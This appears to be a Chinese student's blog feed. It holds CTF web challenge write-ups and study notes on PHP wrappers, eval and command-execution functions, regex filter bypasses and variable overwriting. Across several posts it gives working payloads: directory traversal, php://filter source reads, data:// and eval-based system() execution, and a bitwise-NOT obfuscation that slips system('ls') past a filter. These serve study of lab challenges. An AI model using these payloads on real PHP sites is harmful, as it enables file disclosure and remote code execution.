        <content type="html"><![CDATA[<p>最近两天刚学sql注入，发现还是要有数据库的基础才行，（否则连sql的语句都看不懂啥意思）所以正在学数据库，sql的题暂时就先放一下，先做别的题了。当然也会更新一下学数据库的笔记。  </p><h1 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h1><p>这道题目还是很简单的，打开题目发现一只猫。<br><img src="https://s3.ax1x.com/2021/01/16/sDcJEQ.md.png" alt="sDcJEQ.md.png"><br>对于这种页面点不动的题，直接查看源码。<br><img src="https://s3.ax1x.com/2021/01/16/sDc5DO.md.png" alt="sDc5DO.md.png"><br>可以看到源码中将<strong>cat</strong>设为变量，并使用get方式传参。后面又说当变量cat==dog这个字符串时，就会显示flag。<br>那么接下来就很简单了。直接在url上输入就可以了。<br><img src="https://s3.ax1x.com/2021/01/16/sDgjY9.md.png" alt="sDgjY9.md.png"><br>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习1</title>
      <link href="test4/undefined-undefined.html"/>
      <url>test4/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>寒假到了，菜鸡练习时间到了。争取每天至少buuctf一道题，并且加上sql注入的学习。<br>因为太长没练手了，所以先来一道代码审计题。</p><h1 id="HCTF-2018-WarmUP1"><a href="#HCTF-2018-WarmUP1" class="headerlink" title="[HCTF 2018]WarmUP1"></a>[HCTF 2018]WarmUP1</h1><p>打开题目发现只有一个大滑稽。<br>于是查看源码<br><img src="https://s3.ax1x.com/2021/01/15/s0MjeJ.md.png" alt="s0MjeJ.md.png"><br>发现&lt; !–source.php– &gt;这个php文件，于是再在网址中打开就可以发现真正的源码（截图没有截全）<br><img src="https://s3.ax1x.com/2021/01/15/s0QJTs.md.png" alt="s0QJTs.md.png"><br>观察可以发现还有一个hint.php文件，于是在网址打开它看一下。<br><img src="https://s3.ax1x.com/2021/01/15/s0QX1f.md.png" alt="s0QX1f.md.png"><br>可以知道flag被放在ffffllllaaaagggg目录中，又因为下面的代码中有include（）这个包含函数，并且要上传file这个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0lI2V.md.png" alt="s0lI2V.md.png"><br>这就要求我们要满足 checkFile(&amp;$page)函数，然后再构造payload，使用../进行跳转到ffffllllaaaagggg目录，就可以得到flag。<br>那么接下来就是对这个函数进行研究。  </p><blockquote><p>if (! isset($page) || !is_string($page))</p></blockquote><p>由这串代码可以看出page为变量，同时是一个字符串。<br>随后这个程序定义了两个字符串为白名单（$whitelist）也就是可以通过的字符串。分别为  </p><blockquote><p>source.php和hint.php</p></blockquote><p>也就是说我们的上传的变量<strong>page</strong>经过变换后要是上面二者之一才能通过checkFile(&amp;$page)函数。  </p><hr><p>先看第一个判断  </p><pre><code>            if (in_array($page, $whitelist)) &#123;                return true;            &#125;</code></pre><p>可以看出这个是直接将page和白名单进行比较，虽然我们直接输入那两个字符串就可以通过，但是这样没有办法用../来跳转目录，所以第一个是没办法绕过的。  </p><hr><p>再来看第二个。  </p><pre><code>            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;  </code></pre><p>这个里面的新函数有substr()和strpos()。  </p><blockquote><p>mb _ substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。<br>其中该函数有三个参数</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/15/s0YVjx.md.png" alt="s0YVjx.md.png"><br>而mb_strpos()函数作用如下  </p><blockquote><p>查找 “php” 在字符串中第一次出现的位置：</p></blockquote><p>他也有三个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0Yox1.md.png" alt="s0Yox1.md.png"><br>将这两个函数联系起来可以发现输入的page字符串最后被截取到“？”这个位置，如我们输入以下字符串  </p><blockquote><p>file=source.php?/../ffffllllaaaagggg</p></blockquote><p>那么再经过变换后得到的结果是source.php。正好可以符合白名单。<br>那么接下来就是进行目录穿越了。我们可以构造以下payload。  </p><blockquote><p>?file=source.php?/../../../../ffffllllaaaagggg</p></blockquote><p>注意../数量要够，否则没法到flag那个目录。<br><img src="https://s3.ax1x.com/2021/01/15/s0aUQs.md.png" alt="s0aUQs.md.png">  </p><hr><p>再看第三个判断。  </p><pre><code>            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;  </code></pre><p>可以看出它多了一个urldecode()函数。也就是将url编码解码，因为当我们输入url后上传时，会自动解码一次。所以说如果我们将“？”连续url编码两次，那么在经过urldecode()函数后就又变成了？这样也可以绕过白名单，所以构造以下payload。  </p><blockquote><p>?file=hint.php%253f/../../../../../ffffllllaaaagggg</p></blockquote><p>同样得到flag。  </p>]]></content>
      
      
      <categories>
          
          <category> test4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第二周练习ssrf1</title>
      <link href="test3/undefined-undefined.html"/>
      <url>test3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周第三道题目可以说是一波三折。  </p><h1 id="SSRF1"><a href="#SSRF1" class="headerlink" title="SSRF1"></a>SSRF1</h1><p>打开题目看到这样的代码<br><img src="https://s3.ax1x.com/2020/12/06/DO4JXQ.md.png" alt="DO4JXQ.md.png"><br>因为题目是SSRF，所以第一时间先去了解了SSRF的相关知识（详细的以后再写一篇博客）<br>简单来说如图<br><img src="https://s3.ax1x.com/2020/12/06/DO5SgS.md.png" alt="DO5SgS.md.png"><br>代码的第一个正则匹配就是对url的验证，它要求url里必须有<strong>dotnet.com</strong>这一字符串才能进行接下来的代码，也就是说才能访问内部系统。（dotnet.com也就相当于内网网址） </p><p>又因为代码最后给出解释flag在“/flag”里，这是一个目录，所以很容易就想到使用file://伪协议来读取网站下的文件，但是可以看到第二个正则匹配过滤掉了所有的php伪协议，并且不能使用大小写绕过，只给出了一个file _get _contents()函数，所以明显要从这个函数下手。  </p><p>但是从菜鸟教程得到的file _get _contents()函数的解释却很少，<br><img src="https://s3.ax1x.com/2020/12/06/DO5H2T.md.png" alt="DO5H2T.md.png"><br>对绕过这个正则函数好像没有什么用，于是又去网上搜索关于file _get _contents()函数的用法，但是搜到的最多只有它和伪协议php://input来搭配使用，依然没办法绕过这个正则函数。  </p><p>正当我正发愁时，终于发现了file _get _contents()函数的另一个用法</p><blockquote><p>当PHP的 file _get _contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞</p></blockquote><p>ohhhhhhhhhhhhh!!!<br>也就是说如果我们构造一个不存在的伪协议头的话，这个伪协议头就会成为一个目录的名称（如<strong>0://dotnet.com</strong>就会被当成目录），这样的话就相当于我们访问了这个网站的这个目录，我们只需不断向上跳转到根目录就能得到flag的文件，于是我构造了以下payload  </p><blockquote><p>?url=0://dotnet.com/../../../../../flag</p></blockquote><p>注意向上跳转的次数一定要够，否则就跳不到根目录。<br>最后就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/06/DOI4yD.md.png" alt="DOI4yD.md.png"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实总体来说并没有考到对ssrf的绕过方式（刚开始我以为是要绕过正则匹配到内网），这道题重点是在file _get _contents()函数，如何利用这个函数来绕过对伪协议的过滤，进行目录穿越。如果不知道这个函数还有这种用法，估计会卡死在伪协议的过滤上。</p>]]></content>
      
      
      <categories>
          
          <category> test3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周习题1</title>
      <link href="test2/undefined-undefined.html"/>
      <url>test2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了平台上更新的两道题，现在写一下做题思路。  </p><h1 id="php伪协议1"><a href="#php伪协议1" class="headerlink" title="php伪协议1"></a>php伪协议1</h1><p>打开题目，得到以下代码<br><img src="https://s3.ax1x.com/2020/12/03/DHp5Cj.md.png" alt="DHp5Cj.md.png"><br>由include()函数可以知道这是一道文件包含题，可以使用php伪协议来做，但是发现源代码里有一个正则函数，过滤了所有php伪协议相关的字符串。那么是不是就不能用伪协议了呢？并不是这样的。<br>再仔细观察这个函数的语法，发现它并没有区分要匹配的字符串的大小写（语法是/i）。也就是说如果我们传入Php这样的字符串的时候是不会被过滤掉的。而get传入并不区分大小写。所以有大写的伪协议同样有效。于是我们便可以利用大小写来绕过这个函数。  </p><hr><p><strong>关于正则表达式的详细语法</strong><br><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式语法</a>  </p><hr><p>我构造的payload如下  </p><blockquote><p>?file=Php://filter/read=convert.Base64-encode/resource=flag</p></blockquote><p>从而得到base64编码过的flag文件<br><img src="https://s3.ax1x.com/2020/12/03/DHPiND.md.png" alt="DHPiND.md.png"><br>再解码就可以得到flag<br>随后又尝试了data://等协议，但是没有效果，不知道原因是什么。  </p><h1 id="php伪协议2"><a href="#php伪协议2" class="headerlink" title="php伪协议2"></a>php伪协议2</h1><p>打开题目，代码如下<br><img src="https://s3.ax1x.com/2020/12/03/DHPQUS.md.png" alt="DHPQUS.md.png"><br>这道题和上一道很像，但是匹配加上了不区分大小写这一条件，利用大小写绕过就不能再用了，这时又注意到一个新函数str_replace()，关于这个函数我在另一篇博客讲过了<br><a href="https://george186.github.io/test1/undefined-undefined.html">关于str_replace()函数</a><br>简单来说，就是它会搜索字符串里的<strong>troye</strong>这个字符串然后将其删除，这正好为我们提供了一个绕过方法，如果我们传入以下字符  </p><blockquote><p>phtroyep://filter/……..</p></blockquote><p>那么它不仅可以绕过第一个正则匹配，而且最终会变成以下字符串  </p><blockquote><p>php://filter/……..</p></blockquote><p>这样既绕过了正则函数，又使最后传入的是伪协议，从而达到读取flag的目的。于是我们构造以下payload  </p><blockquote><p>?file=ptroyehp://filter/read=convert.btroyease64-encode/resource=flag</p></blockquote><p>便可以得到base64编码过的flag，再解码就可以了。<br><img src="https://s3.ax1x.com/2020/12/03/DHi3dK.md.png" alt="DHi3dK.md.png">  </p><hr><p>这两道题是将正则函数绕过和php伪协议放在一起考了，比起单单只用伪协议要难一些。以后的ctf中应该都是这种多个方面在一起考查，所以不能只会一个方面的东西，知识面要广。</p>]]></content>
      
      
      <categories>
          
          <category> test2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界练习---伪协议</title>
      <link href="test1/undefined-undefined.html"/>
      <url>test1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了一道关于伪协议的题，较本周的另两道简单，算是巩固一下关于伪协议的知识<br>打开地址得到以下源代码<br><img src="https://s3.ax1x.com/2020/12/02/DoJ5WR.md.png" alt="DoJ5WR.md.png"><br>有include()函数，可以知道是一道文件包含漏洞题，可以使用php伪协议来解决。（关于文件包含漏洞问题之后再进行总结）<br>再看到有这样一个函数  </p><blockquote><p>str_replace(“php://“, “”, $page);</p></blockquote><p>于是了解一下这个函数<br><img src="https://s3.ax1x.com/2020/12/02/DotOGd.md.png" alt="DotOGd.md.png"><br>可以知道，该函数会匹配get传参的字符串中的php://这个字符串，并将其替换成空格，等于过滤了这个字符串。所以我们不能直接使用php://协议。但是可以使用其他协议，我使用了data://协议。<br>该协议可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>因此我们可以先构造payload来读取文件目录  </p><blockquote><p>?page=data://text/plain,<?php system('ls');?></p></blockquote><p>得到文件目录<br><img src="https://s3.ax1x.com/2020/12/02/DoNtL6.md.png" alt="DoNtL6.md.png"><br>可以知道包含flag的文件，接着使用命令执行函数读出该文件内容就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/02/DoNDWd.md.png" alt="DoNDWd.md.png">  </p><hr><p>当然这道题还有别的解法,str_replace()函数默认情况下识别是分大小写的，所以我们可以通过大小写绕过这个函数，当我们知道包含flag的文件名后，利用大小写可以构造以下payload来绕过  </p><blockquote><p>?page=Php://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p></blockquote><p>得到base64编码过的php文件，再解码就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> test1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议笔记</title>
      <link href="note2/undefined-undefined.html"/>
      <url>note2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习了关于PHP的伪协议相关知识，现在做一下总结<br>先给出我学习的网址<br><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a><br><a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a><br>PHP伪协议包括file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://。下面介绍常用的几个  </p><h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h1><p>file://协议在双off的情况下也可以正常使用<br>allow_url_fopen ：off/on<br>allow_url_include：off/on<br>file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow _url _fopen与allow _url _include的影响。<br>使用方法<br>file:// [文件的绝对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a>  </p></blockquote><p>file:// [文件的相对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a>  </p></blockquote><p>http://网络路径和文件名  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a>  </p></blockquote><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p>这个是我目前用到最多的，它包括php://filter、php://input、 php://stdin、 php://memory 和 php://temp,不需要开启allow _url _fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow _url _include。<br>其中php://filter和php://input使用较多<br><img src="https://s3.ax1x.com/2020/12/02/Do1AuF.md.png" alt="Do1AuF.md.png">  </p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>该协议用于读取源码<br><img src="https://s3.ax1x.com/2020/12/02/Do1GHH.md.png" alt="Do1GHH.md.png"><br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=%5B%E6%96%87%E4%BB%B6%E5%90%8D%5D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%EF%BC%88%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E7%BC%96%E7%A0%81%EF%BC%89">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</a>  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p></blockquote><h2 id="php-input-POST-DATA-执行php代码"><a href="#php-input-POST-DATA-执行php代码" class="headerlink" title="php://input+[POST DATA]执行php代码"></a>php://input+[POST DATA]执行php代码</h2><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a><br>[POST DATA] <?php phpinfo()?></p></blockquote><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p></blockquote><p>关于zip://、compress.bzip2://、compress.zlib://这三个协议目前还没有遇到相关题目，以后遇到再总结更新</p>]]></content>
      
      
      <categories>
          
          <category> note2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中foreach函数笔记</title>
      <link href="note1/undefined-undefined.html"/>
      <url>note1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周做的题目中有一道变量覆盖问题，其中用到了foreach()函数，当时看到别人对这个函数的解释并没有很懂，于是自己又通过查找又了解一下这个函数用法，现在把自己的理解写出来。  </p><h1 id="foreach-函数—-关于-key的值"><a href="#foreach-函数—-关于-key的值" class="headerlink" title="foreach()函数—-关于$key的值"></a>foreach()函数—-关于$key的值</h1><p>先附上我学习这个函数的链接<br><a href="https://blog.csdn.net/qq_39388484/article/details/82839903">详解PHP中foreach的用法和实例</a><br><strong>foreach</strong>有两种语法<br>第一种：遍历给定的 数组语句 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><blockquote><p>foreach (array_expression as $value)</p></blockquote><p>第二种：同上，同时当前单元的键名也会在每次循环中被赋给变量 $key。  </p><blockquote><p>foreach (array_expression as $key =&gt; $value)</p></blockquote><p>这个函数是要和数组搭配起来使用的，下面讲解一下基本的用法  </p><h2 id="一维数组与foreach"><a href="#一维数组与foreach" class="headerlink" title="一维数组与foreach"></a>一维数组与foreach</h2><p>列出一个一维数组<br>    $a = array(‘Tom’,’Mary’,’Peter’,’Jack’);<br>用第一种方法来输出<br>    foreach ($a as $value) {<br>    echo $value.”<br/>“;<br>    }<br>最后得到的结果是Tom，Mary，Peter，Jack<br>用第二种方法来输出  </p><pre><code>foreach ($a as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value.&quot;&lt;br/&gt;&quot;;&#125;  </code></pre><p>得到的结果是<br>0,Tom<br>1,Mary<br>2,Peter<br>3,Jack<br>很明显看到多了$key这个$key的值就是序号0，1，2，3等等<br>但是在题目中有这样一串代码<br>    $$key=$$value<br>当我传入?_200=flag后，结果变成了$ _200=$flag,这时的$key值不再是序号0，1，2，3······而是变成了 _200,这是为什么呢，我在一维关联数组中找到了类似变化  </p><h2 id="一维关联数组与foreach"><a href="#一维关联数组与foreach" class="headerlink" title="一维关联数组与foreach"></a>一维关联数组与foreach</h2><p>如下<br>    $b = array(‘a’=&gt;’Tom’,’b’=&gt;’Mary’,’c’=&gt;’Peter’,’d’=&gt;’Jack’);<br>这时我们再用第一种方法输出结果和上面的相同<br>但是用第二种方式输出则发生变化  </p><pre><code>foreach ($b as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value;&#125;  </code></pre><p>最后得到的结果是：<br>a,Tom<br>b,Mary<br>c,Peter<br>d,Jack<br>很明显，这时候的key值已经变成了关联的序号，也就是a,b,c,····<br>于是我推测，当我们使用post，get方式进行传参的时候，传入的就是一维关联数组，例如上面所讲到的?_ 200=flag就相当于’_ 200’=&gt;’flag’，这样一来，得到的最后结果就变成了$ _200=$flag，$key的值也就发生了变化，最终将flag传入到了变量$ _200中。  </p><hr><p>关于foreach还能和二维数组练习，但是key的值一般不会变化，依旧是序号0，1，2·····更多相关知识还是在分享的链接里查找吧。</p>]]></content>
      
      
      <categories>
          
          <category> note1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习报告</title>
      <link href="note/undefined-undefined.html"/>
      <url>note/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习可以说是一路艰辛  </p><h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>搭建博客使用hexo+github好处多多—-<strong>前提是不报错</strong><br>分享一个搭建博客教学链接<br><a href="">https://www.simon96.online/2018/10/12/hexo-tutorial/</a><br>网上一般都有有报错解决办法，但是有的还是要靠自己摸索<br>下面分享一个我遇到的最坑问题<br>当所有过程都没问题后却发现自己网上博客一片空白（本地博客）没有问题，提供以下解决办法<br><a href="https://imgchr.com/i/D607F0"><img src="https://s3.ax1x.com/2020/11/28/D607F0.md.png" alt="D607F0.md.png"></a><br>将GitHub page路径改成master，因为我上传的文件路径都是master，但是它默认的路径是main，所以出现没有报错但是网上博客一片空白的情况。<br>这个坑卡了我好几天，甚至还删了充搭了一次。。。。。。  </p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>这个出问题自求多福不是玄学问题吧，实在不行换主题。（说多都是泪）  </p><hr><h2 id="web学习笔记"><a href="#web学习笔记" class="headerlink" title="web学习笔记"></a>web学习笔记</h2><h3 id="命令执行函数和eval-函数"><a href="#命令执行函数和eval-函数" class="headerlink" title="命令执行函数和eval()函数"></a>命令执行函数和eval()函数</h3><p>eval()函数能将输入的字符串当作PHP代码来执行，这就很容易造成漏洞，下面是本周做的题目中的一个例子  </p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>很明显，这串代码相当于一个后门，只要你用get传参传入一串可执行的PHP代码就可以执行这串代码，注意结尾要加“；”。<br>命令执行函数常见的有以下几种<br>1、system<br>string system(string command,int &amp;return_var)</p><p>可以用来执行系统命令并将相应的执行结果输出</p><p>2、exec<br>string exec(string command,array &amp;outpub,int &amp;return_var)</p><p>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</p><p>注意：exec输出的是命令执行结果的最后一行内容。如果你需要获取未经处理的全部输出数据，请使用passthru()函数。</p><p>如果想要获取命令的输出内容，请确保使用output参数。</p><p>3、passthru<br>void passthru(string command, int &amp;return_var)</p><p>command是要执行的命令，return_var存放执行命令后的状态值。</p><p>4、 shell_exec<br>string shell_exec(string command)</p><p>command是要执行的命令<br>我现在比较了解的就是system()函数，可以用的命令有很多这些命令和Linux里的命令相似  </p><blockquote><p>cat 一次显示整个文件  </p><p>tac 是将cat反过来写，所以他的功能和cat相反，cat是由第一行到最后一行连续显示在萤幕上，而 tac 则是由最后一行到第一行反向在萤幕上显示出来。</p><p>more  会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页<br>显示，而且还有搜寻字串的功能 。但是在网页上好像不能翻页。 </p><p>less  与 more 类似，但使用 less 可以随意浏览文件使用[pageup] [pagedown] 等按键，而 more 仅能向后移动，却不能向前移动，而且 less 在查看之前不会加载整个文件。同样网页端好像不能翻页。</p></blockquote><p>介绍完eval()和命令执行函数后可以感觉到我们可以使用这一漏洞来查看，修改web服务器里的文件。所以在题目中我构造  </p><blockquote><p>/?a=system(‘ls’);<br>和  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote></blockquote><p>便可以读出其中文件内容。  </p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>eval()虽然好用，但是遇上正则函数便失去作用，正则函数会过滤掉一些字符串，比如cat，tac等，这样就没有办法像一般那样直接传入函数命令，所以要绕过正则函数来上传。这里附上别人的总结<br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142/">关于PHP正则匹配后代码执行的一些绕过方法</a><br>其中可以采取异或绕过，取反绕过，换行符绕过，利用正则回溯次数限制的绕过<br>这里介绍目前我能理解的两种绕过<br><strong>换行符绕过</strong><br>preg_match()函数只能匹配一行字符串，所以使用换行符%0a就可以绕过它的匹配<br><strong>url编码取反绕过</strong><br>这是取反绕过中最简单的一种绕过，该方法只适用于PHP7<br>对于想要传入的参数，先进行url编码再取反<br>例如传入构造一个phpinfo()；<br>只需要将phpinfo取反编码就行<br>如果需要执行有参数的函数，比如system(“ls”);<br>需要分别对system和ls进行取反，分别得到  </p><blockquote><p>%8C%86%8C%8B%9A%92 </p><p>%93%8C</p></blockquote><p>构建payload/?(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C)；就可以绕过正则函数<br>其他的异或绕过和取反绕过以及利用回溯次数绕过需要用到脚本，等我变强了再来讨论吧hhhhh  </p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>附上学习的链接<br><a href="https://blog.csdn.net/qq_41381461/article/details/90047616">php变量覆盖</a><br>先总结我目前遇到的两种<br><strong>extract()函数变量覆盖</strong><br><a href="https://www.runoob.com/php/func-array-extract.html">菜鸟教程关于extract的讲解</a><br>总的来说extract()函数在默认情况下，会将传入的变量的值覆盖原有的变量的值，如以下代码<br>&lt;?php  </p><blockquote><p>$id=1;<br>extract($_GET);<br>echo $id;<br>?&gt;<br>//提交：?id=123<br>//结果： 123</p></blockquote><p>所以可以将原本不知道的变量的值进行覆盖，使其成为我们传入的值，对于  </p><blockquote><p>if($liwu==$flag) {<br>        echo’flag{xxxxxxxxxxx}’;</p></blockquote><p>这类代码漏洞十分有用。<br>**$$导致的变量覆盖问题**<br>在PHP中$$表示的是一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。如以下代码<br>&lt;?php  </p><blockquote><p>$c=’hello’;<br>$$c=’world’;<br>echo $c;<br>echo $$c;<br>?&gt;</p></blockquote><p>得到的结果是helloworld，也就是说将$c作为一个变量名进行赋值，从而覆盖了原来的$c=hello。<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $value;<br>}<br>echo $a;<br>?&gt;</p></blockquote><p>如果如果get传的是?id=1，那么，经过$$key=$value之后，就会变成$id=1，覆盖掉原来的$id=5。<br>如果代码如下<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $$value;<br>}<br>echo $a;<br>?&gt;  </p></blockquote><p>那么如果get传入的是?id=flag,经过$$key = $$value之后就会变成$id=$flag，此时$flag里面的值，也就是flag已经被写入$id当中了。以上两组代码结合起来便可以实现  </p><blockquote><p>$_POST[“flag”] == $flag</p></blockquote><p>这样的要求<br>关于foreach()细节以后再另写笔记说。（因为写到这已经是凌晨一点半了。。。。。）  </p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第一周练习</title>
      <link href="test/undefined-undefined.html"/>
      <url>test/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>  第一周的web一共做了四道题，现在写下做题思路，以便日后回顾。</p><h1 id="一，basic-rec"><a href="#一，basic-rec" class="headerlink" title="一，basic rec"></a>一，basic rec</h1><p>打开题目地址，得到如下代码。<br><img src="https://s3.ax1x.com/2020/11/28/D6NtTf.md.png" alt="D6NtTf.md.png"><br>真正有用的函数只有一个</p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>于是立刻学习关于eval函数的相关用法和知识<br>这是从菜鸟教程上得知的eval()函数的用法  </p><blockquote><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p></blockquote><p>所以可以看成这个网页已经被上传了一个木马，只要我们以get请求方式上传以下形式的字符到变量a，就能将被上传的字符串按照PHP代码来执行  </p><blockquote><p>/?a=”一串PHP代码”；（结尾要有分号才能执行该代码）</p></blockquote><p>但是该上传什么样的PHP代码呢，因为我要找到flag，所以要查看该网页服务器下有flag的文件，所以选用执行系统命令函数，该函数有以下几种system()passthru()exec()shell_exec()popen()proc_open()<br>pcntl_exec()，我选用的是system()函数<br>system()函数执行有回显，会将结果输出到页面上  </p><blockquote><p>string system ( string $command [, int &amp;$return_var ])</p></blockquote><p>$command是执行的命令，[]里的可选可不选，可以执行的命令与Linux中相似，有ls，cat，tac，more，less，等其中ls是显示文件目录，cat，tac等都是查看文件内容的命令，首先我查看文件目录，于是输入以下命令  </p><blockquote><p>/?a=system(‘ls’);</p></blockquote><p>得到文件目录<br><a href="https://imgchr.com/i/D6NrXn"><img src="https://s3.ax1x.com/2020/11/28/D6NrXn.md.png" alt="D6NrXn.md.png"></a><br>知道flag在f111a9.php中，接着便读取出该文件内容  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote><p>得到flag。<br><a href="https://imgchr.com/i/D6NRtU"><img src="https://s3.ax1x.com/2020/11/28/D6NRtU.md.png" alt="D6NRtU.md.png"></a></p><h1 id="二，PHP变量覆盖"><a href="#二，PHP变量覆盖" class="headerlink" title="二，PHP变量覆盖"></a>二，PHP变量覆盖</h1><p>打开题目地址得到如下代码<br><a href="https://imgchr.com/i/D6Nhp4"><img src="https://s3.ax1x.com/2020/11/28/D6Nhp4.md.png" alt="D6Nhp4.md.png"></a>  </p><p>这道题目的重点是extrace()函数<br>extrace()将从数组中将变量导入到当前符号表，默认的是如果变量冲突，则覆盖已有的变量<br>知道这个函数后再对代码进行审计  